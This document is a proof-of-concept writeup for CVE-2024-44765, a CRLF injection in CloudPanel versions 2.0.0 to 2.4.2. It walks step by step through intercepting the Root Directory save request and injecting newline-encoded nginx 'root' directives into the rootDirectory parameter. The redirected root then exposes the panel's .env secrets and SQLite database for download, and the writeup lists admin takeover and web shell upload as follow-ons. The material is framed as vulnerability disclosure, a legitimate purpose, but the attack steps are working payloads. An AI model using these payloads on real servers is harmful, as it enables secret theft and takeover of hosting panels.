# Proof of Concept (PoC) for Cloudpanel [Improper Authorization or Access Control Misconfiguration / CVE-2024-44765]

## üìñ Introduction
> A CRLF injection vulnerability in MGT-COMMERCE GmbH CloudPanel v2.0.0 to v2.4.2 allows low privilege attackers to escalate privileges and access sensitive information via manipulation of the Nginx configuration file.
> <br> [!] Low Privilege user also could directly modify its vhost configuration to retrieve sensitive data. [!]

---

## üîç Overview

- **Researcher:** [Your Name](https://github.com/EagleTube)
- **CVE ID:** CVE-2024-44765
- **Vulnerability Type:** CRLF Injection
- **Affected Products:** v2.0.0 - 2.4.2
- **Severity:** High
- **Fix Available:** No

---

## üõ†Ô∏è Technical Details

A detailed technical description of the vulnerability, including:
- The root cause of this issue when user are not restrict modifying vhost nginx configuration
- The vulnerability occur when attacker which have low privilege manipulate the nginx configuration by change its document root to main cloudpanel document root
- After change the root folder in nginx configuration , attacker could download .env and .sq3 sqlite file in main clp directory

## üö®Post Exploitation
- Data Breach
- Admin Account Take Over
- Secret Key Exposure
- Web Shell upload
- Privilege Escalation

### Vulnerability Documentation:

- This vulnerability require at least lower privileges in cloudpanel, follow this step to achieve the CRLF injection

1. **Step 1**: Access the cloudpanel with your user:

2. **Step 2**: Click manage and check Root Directory input:

3. **Step 3**: Click save and intercept the request via burp suite:

4. **Step 4**: Leaking sensitive data.

    4.1 **Step 4.1**: (leak secret token) From the site_domain_settings[rootDirectory] parameter query put payload like below.
        ```
        site_domain_settings[rootDirectory]=yourdomain.my;%0aroot%20/home/clp/htdocs/app/files
        ```
   
    4.2 **Step 4.2**: (leak sqlite db) From the site_domain_settings[rootDirectory] parameter query put payload like below.
        ```
        site_domain_settings[rootDirectory]=yourdomain.my;%0aroot%20/home/clp/htdocs/app/data
        ```
   
5. **Step 5**: Open your website and your root directory have change now you just put .env or db.sq3.
   ```
   https://yourdomain.my/.env | https://yourdomain.my/db.sq3
   ```
